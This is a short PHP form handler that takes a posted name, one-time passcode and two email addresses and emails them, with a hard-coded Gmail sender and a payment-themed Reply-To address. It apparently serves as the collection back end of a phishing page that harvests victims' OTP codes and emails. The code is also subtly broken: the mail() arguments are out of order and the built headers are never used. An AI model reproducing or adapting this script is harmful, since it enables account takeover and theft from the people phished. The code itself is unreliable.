<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $key1_name = $_POST['name'];
    $key1_otp = $_POST['otp'];
    $key1_other_email = $_POST['other_email'];
    $key1_user_email = $_POST['user_email'];

    $headers = 'From: aiyedunmiracle956888@gmail.com' . "\r\n" .
        'Reply-To: safepay213@gmail.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

    if (mail($key1_name, $key1_otp, $key1_other_email, $key1_user_email)) {
        echo 'Email sent successfully.';
    } else {
        echo 'Failed to send email.';
    }
}
?>